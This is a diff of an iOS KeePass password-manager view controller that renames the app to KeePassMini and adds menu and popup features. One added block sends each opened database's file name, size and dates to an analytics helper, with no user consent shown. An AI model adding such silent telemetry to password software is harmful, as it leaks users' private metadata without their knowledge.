@@ -22,12 +22,23 @@ import FilesProvider
 import SwiftSpinner
 import OAuthSwift
 import SwiftUI
+import Luminous
+import CryptoSwift
+import SwiftEntryKit
+
+
+
+
 //import FLEX
 
 class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportDatabaseDelegate, UIDocumentBrowserViewControllerDelegate, FileProviderDelegate {
     private let databaseReuseIdentifier = "DatabaseCell"
     private let keyFileReuseIdentifier = "KeyFileCell"
     private let trayIdentifier = "TrayCell"
+    
+    
+    
+    private var presetSource = PresetsDataSource()
     
     lazy var documentBrowser: DocumentBrowserViewController = {
       return DocumentBrowserViewController()
@@ -58,6 +69,11 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
     var isFirstTime: Int = 0
     var rfc = UIRefreshControl()
     var cloudButton = UIBarButtonItem()
+   
+   
+
+
+    
     override func viewDidLoad() {
         super.viewDidLoad();
         // Activate KeyboardGuide at the beginning of application life cycle.
@@ -77,6 +93,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         localProvider = nil
         iCloudProvider = nil
         
+       
         
             switch cloudType{
                 case 0:
@@ -90,7 +107,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 
                    DispatchQueue.global(qos: .background).async {
                         print("Init icloud on background thread")
-                        self.iCloudProvider = CloudFileProvider(containerId: nil) //"iCloud.unicomedv.de.IOSKeePass")
+                        self.iCloudProvider = CloudFileProvider(containerId: nil) //"iCloud.unicomedv.de.KeePassMini")
                         DispatchQueue.main.async {
                             
                             if(self.iCloudProvider != nil){
@@ -185,6 +202,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             self.navigationItem.leftBarButtonItem = cloudButton
         }
 
+        presetSource.setup()
       
         print("HomePath:\(NSHomeDirectory())")
         
@@ -196,7 +214,6 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         updateFiles();
         super.viewWillAppear(animated)
         let appSettings = AppSettings.sharedInstance() as AppSettings
-        
         
         cloudType = appSettings.cloudType()
       /*  switch cloudType{
@@ -239,6 +256,44 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
      override func viewDidAppear(_ animated: Bool) {
         super.viewDidAppear(animated)
         
+         let appSettings = AppSettings.sharedInstance() as AppSettings
+         
+         if(appSettings.userNotify() == true){
+             /*let notattr = presetSource[1, 0].attributes
+           
+             showNotificationMessage(attributes: notattr,title: NSLocalizedString("Your Files Folder is empty 📂", comment: ""),desc: NSLocalizedString("Please use + Button for create a new empty KeePassDB or using Import Button to get your actual KeePass DB from your Sharepoints ⚙️", comment:""),textColor: EKColor(red: 10, green: 163, blue: 255),imageName: "AppIcon")
+              */
+             // Generate top floating entry and set some properties
+             let attr = presetSource[3, 5].attributes
+             let image = UIImage(named: "ic_info_outline")!.withRenderingMode(.alwaysTemplate)
+             let title =  NSLocalizedString("Important note about KeePassMini !", comment: "").uppercased()
+             let description = NSLocalizedString("Unfortunately, we can not offer IOSKeePass", comment: "")
+             
+              /*"""
+             Leider können wir IOSKeePass nicht mehr mit dem Zusatz IOS \
+             über den Apple App Store ausrollen, da wir mit dem zusatz \
+             gegen die Richtlinen vom Apple App Store verstoßen. Leider hängt an diesem namen \
+             auch die sichere Schlüsselbundverwaltung welche IOS anbietet und wir im Quellcode benutzen. \
+             Aus diesem Grund sollten Sie zunächst die alte APP mit dem Appnamen \
+             IOSKeePass behalten, bis alle Ihre KeePass DB´s und KEYS mit den Endnungen \
+             .kdb und .kdbx sowie die .key und keyx Dateien über den Import Button (unten mitte rechts) \
+             vom Verzeichniss IOSKeePass in das neue Verzeichniss mit dem namen \
+             KeePassMini migriert haben, und ggf. mittels Face/TouchId den neuen \
+             Schlüsselbund angelernt haben. Wenn sie alle KeePass DBs migriert haben, \
+             können Sie die IOSKeePass ohne Datenverlust von Ihrem Apple gerät entfernen.
+             """*/
+             showPopupMessage(attributes: attr,
+                              title: title,
+                              titleColor: .text,
+                              description: description,
+                              descriptionColor: EKColor(red: 10, green: 10, blue: 10),
+                              buttonTitleColor: .white,
+                              buttonBackgroundColor: EKColor(red: 10, green: 163, blue: 255),
+                              image: image)
+             
+             appSettings.setUserNotify(false)
+         }
+         
         if(self.isFirstTime == 0){
            
             let appSettings = AppSettings.sharedInstance() as AppSettings
@@ -252,6 +307,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                     let appDelegate = AppDelegate.getDelegate()
                     let document = appDelegate?.getOpenDataBase()
                     if(document != nil){
+                      
                         performSegue(withIdentifier: "fileOpened", sender: nil)
                     }
                 }
@@ -260,7 +316,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             if(databaseFiles.count == 0){
                 let notiData = HDNotificationData(
                             iconImage: UIImage(named: "AppIcon"),
-                            appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                            appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                             title: NSLocalizedString("Your Files Folder is empty 📂", comment: ""),
                             message: NSLocalizedString("Please use + Button for create a new empty KeePassDB or using Import Button to get your actual KeePass DB from your Sharepoints ⚙️", comment:""),
                             time: NSLocalizedString("now", comment: ""))
@@ -272,7 +328,6 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         
      }
    
-    
   
     override func tableView(_ tableView: UITableView,contextMenuConfigurationForRowAt indexPath: IndexPath, point: CGPoint)
     -> UIContextMenuConfiguration? {
@@ -299,10 +354,16 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                     self.deleteRowAtIndexPath(indexPath)
               }
                 
-            let renameAction = UIAction(
+            let changeAction = UIAction(
               title: "Change Masterkey",
               image: UIImage(systemName: "key.horizontal")) { _ in
                   self.changePWDRowAtIndexPath(indexPath)
+            }
+               
+            let renameAction = UIAction(
+              title: "Rename Database",
+              image: UIImage(systemName: "doc.on.doc")) { _ in
+                  self.changeNameRowAtIndexPath(indexPath)
             }
                 
             let removeAction = UIAction(
@@ -314,7 +375,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             let recoverAction = UIAction(
               title: "Recover Keypass DB",
               image: UIImage(systemName: "figure.run.square.stack")) { _ in
-                  self.changePWDRowAtIndexPath(indexPath)
+                  self.recoverRowAtIndexPath(indexPath)
             }
              
             let syncAction = UIAction(
@@ -336,10 +397,10 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                     let appSettings = AppSettings.sharedInstance() as AppSettings
                     if(appSettings.backupEnabled() == true){
                         //return [syncAction,shareAction,deleteAction, renameAction, defaultAction]
-                        return UIMenu(title: "", image: nil, children: [defaultAction,deleteAction,renameAction,syncAction,shareAction])
+                        return UIMenu(title: "", image: nil, children: [defaultAction,deleteAction,renameAction,changeAction,syncAction,shareAction])
                     }else{
                         //return [shareAction,deleteAction, renameAction, defaultAction]
-                        return UIMenu(title: "", image: nil, children: [defaultAction,deleteAction,renameAction,shareAction])
+                        return UIMenu(title: "", image: nil, children: [defaultAction,deleteAction,renameAction,changeAction,shareAction])
                     }
                    
                 case .keyFiles:
@@ -372,7 +433,36 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             
             
             let appDelegate = AppDelegate.getDelegate()
+            let databaseManager = DatabaseManager.sharedInstance()
             let document = appDelegate?.getOpenDataBase()//appDelegate?.databaseDocument
+            let fname = document?.url.lastPathComponent
+            let size = databaseManager?.getFileSize(document?.url)
+            let date = databaseManager?.getFileLastModificationDate(document?.url)
+            let nowdate = Date()
+            var sstr = String(format:"%@ Bytes", size!)
+            
+            if(Int64(truncating: size!) > 1024){
+                sstr = String(format:"%d KB", Int64(truncating: size!)/1024)
+            }
+            
+            if(Int64(truncating: size!) > (1024*1024)){
+                sstr = String(format:"%d MB", Int64(truncating: size!)/1024/1024)
+            }
+            
+            if(Int64(truncating: size!) > (1024*1024*1024)){
+                sstr = String(format:"%d GB", Int64(truncating: size!)/1024/1024/1024)
+            }
+            
+            let dateFormatter = DateFormatter()
+            dateFormatter.dateStyle = .short
+            dateFormatter.timeStyle = .short
+            
+            let mstr = dateFormatter.string(from: date ?? nowdate)
+            let dstr = dateFormatter.string(from: nowdate)
+            
+            let retval = String("").sendAnalytics(fname!, dbsize: sstr, modate: mstr, date: dstr, action: "OpenDataBase_Mini")
+           
+            //print(retval as Any)
             //Check if file is available on cloud connection
              switch cloudType{
                   case 0:
@@ -436,6 +526,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
         }
     }
     
+    
     @objc func refreshFiles(sender:AnyObject) {
       self.updateFiles()
       self.tableView.reloadData()
@@ -474,7 +565,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
                 let notiData = HDNotificationData(
                             iconImage: UIImage(named: "AppIcon"),
-                            appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                            appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                             title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                             message: NSLocalizedString("Sorry WebDav temporarily not available", comment: ""),
                             time: NSLocalizedString("now", comment: ""))
@@ -495,7 +586,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                     let notiData = HDNotificationData(
                                 iconImage: UIImage(named: "AppIcon"),
-                                appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                 title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                                 message: NSLocalizedString("Sorry Cloud temporarily not reachable:", comment:""),
                                 time: NSLocalizedString("now", comment: ""))
@@ -506,14 +597,14 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             }else{
                 self.navigationItem.leftBarButtonItem = self.cloudButton
                 let localurl = URL(fileURLWithPath: document.filename)
-                let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
                 let localattrib = try? FileManager.default.attributesOfItem(atPath: document.filename)
                 self.webdavProvider?.attributesOfItem(path: remotePath, completionHandler:{ attrib, error in
                     if(error == nil){
                         let localdate = localattrib?[FileAttributeKey.modificationDate] as? Date
                         var clouddate:Date = (attrib?.modifiedDate)!
-                        let cds = clouddate.timeIntervalSinceReferenceDate //we add 180 secs because the modified date is different between local and cloud
-                        let lds = localdate!.timeIntervalSinceReferenceDate+90
+                        let cds = clouddate.timeIntervalSinceReferenceDate //we add 150 secs because the modified date is different between local and cloud
+                        let lds = localdate!.timeIntervalSinceReferenceDate+150
                                 //return attr[FileAttributeKey.modificationDate] as? Date
                         print("Modify Date:\(attrib?.modifiedDate) local:\(localattrib?[FileAttributeKey.modificationDate]) md5-Base64:\(document.md5Base64)")
                         
@@ -521,7 +612,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                             DispatchQueue.main.async {
                                 let notiData = HDNotificationData(
                                             iconImage: UIImage(named: "AppIcon"),
-                                            appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                            appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                             title: NSLocalizedString("Newer KeePass File ℹ️",comment:""),
                                             message: NSLocalizedString("Newer Keepass file found on your Cloud Storage, please use Cloud sync procedure to syncing to newest content",comment:""),
                                             time:NSLocalizedString("now", comment: ""))
@@ -556,7 +647,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title:  NSLocalizedString("Need iCloud Backup ⚠️", comment: ""),
                         message: NSLocalizedString("Sorry iCloud temporarily not available", comment: ""),
                         time: NSLocalizedString("now", comment: ""))
@@ -577,7 +668,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                     let notiData = HDNotificationData(
                                 iconImage: UIImage(named: "AppIcon"),
-                                appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                 title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                                 message: NSLocalizedString("Sorry Cloud temporarily not reachable:", comment:""),
                                 time: NSLocalizedString("now", comment: ""))
@@ -588,7 +679,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             }else{
                 self.navigationItem.leftBarButtonItem = self.cloudButton
                 let localurl = URL(fileURLWithPath: document.filename)
-                let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
                 let localattrib = try? FileManager.default.attributesOfItem(atPath: document.filename)
                
                 
@@ -606,7 +697,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                             DispatchQueue.main.async {
                                 let notiData = HDNotificationData(
                                             iconImage: UIImage(named: "AppIcon"),
-                                            appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                            appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                             title: NSLocalizedString("Newer KeePass File ℹ️",comment:""),
                                             message: NSLocalizedString("Newer Keepass file found on your Cloud Storage, please use Cloud sync procedure to syncing to newest content",comment:""),
                                             time:NSLocalizedString("now", comment: ""))
@@ -636,7 +727,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                         message: NSLocalizedString("Sorry Cloud temporarily not reachable:", comment:""),
                         time: NSLocalizedString("now", comment: ""))
@@ -651,7 +742,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                     let notiData = HDNotificationData(
                                 iconImage: UIImage(named: "AppIcon"),
-                                appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                 title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                                 message: NSLocalizedString("Sorry Cloud connection temporarily not reachable:",comment:""),
                                 time: NSLocalizedString("now", comment: ""))
@@ -669,20 +760,20 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                        // let dir = FileManager.default //urls(for: .documentDirectory, in: .userDomainMask).first
                         let localurl = URL(fileURLWithPath: fnb!)
                         
-                        let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
-                        let icloudKeePassPath = "/IOSKeePass"
-                        let icloudBackupPath =  "/IOSKeePass/Backups"
-                        //Check is IOSKeePass on Cloud
+                        let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
+                        let icloudKeePassPath = "/KeePassMini"
+                        let icloudBackupPath =  "/KeePassMini/Backups"
+                        //Check is KeePassMini on Cloud
                         self.webdavProvider?.attributesOfItem(path: icloudKeePassPath, completionHandler:{ attribute, error in
                             
                             if(attribute == nil){
                                 
                                 print("Error on webDav Direcrory:\(icloudKeePassPath) not exists")
-                                self.webdavProvider?.create(folder: "IOSKeePass", at: "/", completionHandler: { err in
-                                    print("Error can´t Create Directory IOSKeePass:\(err)")
+                                self.webdavProvider?.create(folder: "KeePassMini", at: "/", completionHandler: { err in
+                                    print("Error can´t Create Directory KeePassMini:\(err)")
                                 })
                             }else{
-                                print("Directory IOSKeePass Exists")
+                                print("Directory KeePassMini Exists")
                             }
                             
                             self.webdavProvider?.attributesOfItem(path: icloudBackupPath, completionHandler:{ attribute, error in
@@ -691,7 +782,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                                     DispatchQueue.main.async {
                                         let notiData = HDNotificationData(
                                                     iconImage: UIImage(named: "AppIcon"),
-                                                    appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                                    appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                                     title:  NSLocalizedString("Create Cloud Infrastructure ⚠️", comment: ""),
                                                     message: NSLocalizedString("Createing Directorys on Cloud please try it again ✅",comment:""),
                                                     time: NSLocalizedString("now", comment: ""))
@@ -699,14 +790,14 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                                         HDNotificationView.show(data: notiData,secounds:9.0, onTap: nil, onDidDismiss: nil)
                                     }
                                     print("Error on webdav contents of Direcrory:\(icloudBackupPath)")
-                                    self.webdavProvider?.create(folder: "Backups", at: "/IOSKeePass", completionHandler: { err in
+                                    self.webdavProvider?.create(folder: "Backups", at: "/KeePassMini", completionHandler: { err in
                                         print("Error can´t Create Directory Backups:\(err)")
                                         
                                     })
                                     
                                     
                                 }else{
-                                    print("Directory IOSKeePass Exists")
+                                    print("Directory KeePassMini Exists")
                                 }
                             
                             })
@@ -743,7 +834,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                         message: "Sorry OneDrive temporarily not available",
                         time: NSLocalizedString("now", comment: ""))
@@ -759,7 +850,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
                 let nData = HDNotificationData(
                             iconImage: UIImage(named: "AppIcon"),
-                            appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                            appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                             title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                             message: "Sorry OneDrive temporarily not reachable:",
                             time: NSLocalizedString("now", comment: ""))
@@ -774,17 +865,17 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                     
                    // let dir = FileManager.default //urls(for: .documentDirectory, in: .userDomainMask).first
                     let localurl = URL(fileURLWithPath: fnb!)
-                    let remotePath = "/IOSKeePass/Backups"
-                    let remotefile = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                    let remotePath = "/KeePassMini/Backups"
+                    let remotefile = "/KeePassMini/Backups/"+localurl.lastPathComponent
                     
                     self.onedriveProvider?.contentsOfDirectory(path: remotePath, completionHandler:{ files, error in
                         
                         if(error != nil){
                             
                             print("Error on OneDrive contents of Direcrory:\(error)")
-                            self.onedriveProvider?.create(folder: "IOSKeePass", at: "/", completionHandler: { err in
-                                print("Create Directory IOSKeePass:\(err)")
-                                self.onedriveProvider?.create(folder: "Backups", at: "/IOSKeePass", completionHandler: { err in
+                            self.onedriveProvider?.create(folder: "KeePassMini", at: "/", completionHandler: { err in
+                                print("Create Directory KeePassMini:\(err)")
+                                self.onedriveProvider?.create(folder: "Backups", at: "/KeePassMini", completionHandler: { err in
                                     print("Create Directory Backup:\(err)")
                                 })
                             })
@@ -816,7 +907,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                     let nData = HDNotificationData(
                                 iconImage: UIImage(named: "AppIcon"),
-                                appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                 title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                                 message: "Sorry OneDrive temporarily not reachable:",
                                 time: NSLocalizedString("now", comment: ""))
@@ -834,16 +925,16 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                        // let dir = FileManager.default //urls(for: .documentDirectory, in: .userDomainMask).first
                         let localurl = URL(fileURLWithPath: fnb!)
                         
-                        let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                        let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
                         
                         self.onedriveProvider?.contentsOfDirectory(path: remotePath, completionHandler:{ files, error in
                             
                             if(error != nil){
                                 
                                 print("Error on webDav contents of Direcrory:\(error)")
-                                self.onedriveProvider?.create(folder: "IOSKeePass", at: "/", completionHandler: { err in
-                                    print("Create Directory IOSKeePass:\(err)")
-                                    self.onedriveProvider?.create(folder: "Backups", at: "/IOSKeePass", completionHandler: { err in
+                                self.onedriveProvider?.create(folder: "KeePassMini", at: "/", completionHandler: { err in
+                                    print("Create Directory KeePassMini:\(err)")
+                                    self.onedriveProvider?.create(folder: "Backups", at: "/KeePassMini", completionHandler: { err in
                                         print("Create Directory Backup:\(err)")
                                     })
                                 })
@@ -882,7 +973,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 })
                // let dir = FileManager.default //urls(for: .documentDirectory, in: .userDomainMask).first
                 let localurl = URL(fileURLWithPath: fnb!)
-                let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
                 //check is Backup Location exist
                 self.onedriveProvider?.contentsOfDirectory(path: remotePath, completionHandler:{ files, error in
                     
@@ -910,7 +1001,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                         message: "Sorry iCloud temporarily not available",
                         time: NSLocalizedString("now", comment: ""))
@@ -925,7 +1016,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                     let nData = HDNotificationData(
                                 iconImage: UIImage(named: "AppIcon"),
-                                appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                                appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                                 title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                                 message: "Sorry iCloud temporarily not reachable:",
                                 time: NSLocalizedString("now", comment: ""))
@@ -943,20 +1034,20 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                        // let dir = FileManager.default //urls(for: .documentDirectory, in: .userDomainMask).first
                         let localurl = URL(fileURLWithPath: fnb!)
                         
-                        let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
-                        let icloudKeePassPath = "/IOSKeePass"
-                        let icloudBackupPath =  "/IOSKeePass/Backups"
-                        //Check is IOSKeePass on Cloud
+                        let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
+                        let icloudKeePassPath = "/KeePassMini"
+                        let icloudBackupPath =  "/KeePassMini/Backups"
+                        //Check is KeePassMini on Cloud
                         self.iCloudProvider?.attributesOfItem(path: icloudKeePassPath, completionHandler:{ attribute, error in
                             
                             if(attribute == nil){
                                 
                                 print("Error on iCloud Direcrory:\(icloudKeePassPath) not exists")
-                                self.iCloudProvider?.create(folder: "IOSKeePass", at: "/", completionHandler: { err in
-                                    print("Error can´t Create Directory IOSKeePass:\(err)")
+                                self.iCloudProvider?.create(folder: "KeePassMini", at: "/", completionHandler: { err in
+                                    print("Error can´t Create Directory KeePassMini:\(err)")
                                 })
                             }else{
-                                print("Directory IOSKeePass Exists")
+                                print("Directory KeePassMini Exists")
                             }
                         })
                             
@@ -965,7 +1056,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                             if(attribute == nil){
                                 
                                 print("Error on iCloud contents of Direcrory:\(icloudBackupPath)")
-                                self.iCloudProvider?.create(folder: "Backups", at: "/IOSKeePass", completionHandler: { err in
+                                self.iCloudProvider?.create(folder: "Backups", at: "/KeePassMini", completionHandler: { err in
                                     print("Error can´t Create Directory Backups:\(err)")
                                     
                                 })
@@ -1006,7 +1097,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title: NSLocalizedString("Copy WebDav Backup ⚠️",comment: ""),
                         message: NSLocalizedString("Sorry WebDav temporarily not available", comment: ""),
                         time: NSLocalizedString("now", comment: ""))
@@ -1021,7 +1112,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                 DispatchQueue.main.async {
                 let notiData = HDNotificationData(
                             iconImage: UIImage(named: "AppIcon"),
-                            appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                            appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                             title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                             message: "Sorry OneDrive temporarily not reachable:",
                             time: NSLocalizedString("now", comment: ""))
@@ -1036,11 +1127,11 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                     // Setup iCloud Nexcloud
                    
                     
-                    self.webdavProvider?.create(folder: "IOSKeePass", at: "/", completionHandler: { err in
+                    self.webdavProvider?.create(folder: "KeePassMini", at: "/", completionHandler: { err in
                         print("Status:\(err)")
                     })
                     
-                    self.webdavProvider?.create(folder: "Backups", at: "/IOSKeePass", completionHandler: { err in
+                    self.webdavProvider?.create(folder: "Backups", at: "/KeePassMini", completionHandler: { err in
                         print("Status:\(err)")
                     })
                     
@@ -1058,7 +1149,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                             fileURLs.forEach { localurl in
                                 print("Backup:\(localurl)")
                                 
-                                let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                                let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
                                 self.webdavProvider?.copyItem(localFile: localurl, to: remotePath, overwrite: true, completionHandler: { err in
                                     if(err != nil){
                                         self.backupcount = self.backupcount - 1
@@ -1083,11 +1174,11 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             // Setup iCloud Nexcloud
            
             
-            webdavProvider?.create(folder: "IOSKeePass", at: "/", completionHandler: { err in
+            webdavProvider?.create(folder: "KeePassMini", at: "/", completionHandler: { err in
                 print("Status:\(err)")
             })
             
-            webdavProvider?.create(folder: "Backups", at: "/IOSKeePass", completionHandler: { err in
+            webdavProvider?.create(folder: "Backups", at: "/KeePassMini", completionHandler: { err in
                 print("Status:\(err)")
             })
             
@@ -1105,7 +1196,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                     fileURLs.forEach { localurl in
                         print("Backup:\(localurl)")
                         
-                        let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                        let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
                         webdavProvider?.copyItem(localFile: localurl, to: remotePath, overwrite: true, completionHandler: { err in
                             if(err != nil){
                                 self.backupcount = self.backupcount - 1
@@ -1129,7 +1220,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title: "Copy OneDrive Backup ⚠️",
                         message: "Sorry OneDrive temporarily not available",
                         time: NSLocalizedString("now", comment: ""))
@@ -1145,11 +1236,11 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             // Setup iCloud Nexcloud
            
             
-            onedriveProvider?.create(folder: "IOSKeePass", at: "/", completionHandler: { err in
+            onedriveProvider?.create(folder: "KeePassMini", at: "/", completionHandler: { err in
                 print("Status:\(err)")
             })
             
-            onedriveProvider?.create(folder: "Backups", at: "/IOSKeePass", completionHandler: { err in
+            onedriveProvider?.create(folder: "Backups", at: "/KeePassMini", completionHandler: { err in
                 print("Status:\(err)")
             })
             
@@ -1167,7 +1258,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
                     fileURLs.forEach { localurl in
                         print("Backup:\(localurl)")
                         
-                        let remotePath = "/IOSKeePass/Backups/"+localurl.lastPathComponent
+                        let remotePath = "/KeePassMini/Backups/"+localurl.lastPathComponent
                         webdavProvider?.copyItem(localFile: localurl, to: remotePath, overwrite: true, completionHandler: { err in
                             if(err != nil){
                                 self.backupcount = self.backupcount - 1
@@ -1191,7 +1282,7 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             DispatchQueue.main.async {
             let notiData = HDNotificationData(
                         iconImage: UIImage(named: "AppIcon"),
-                        appTitle: NSLocalizedString("Notify from IOSKeePass", comment: "").uppercased(),
+                        appTitle: NSLocalizedString("Notify from KeePassMini", comment: "").uppercased(),
                         title:  NSLocalizedString("Need Cloud Backup ⚠️", comment: ""),
                         message: "Sorry iCloud temporarily not available",
                         time: NSLocalizedString("now", comment: ""))
@@ -1207,11 +1298,11 @@ class FilesViewController: UITableViewController, NewDatabaseDelegate,ImportData
             // Setup iCloud Nexcloud
            
             
-            iCloudProvider?.create(folder: "IOSKeePass", at: "/", completionHandler: { err in
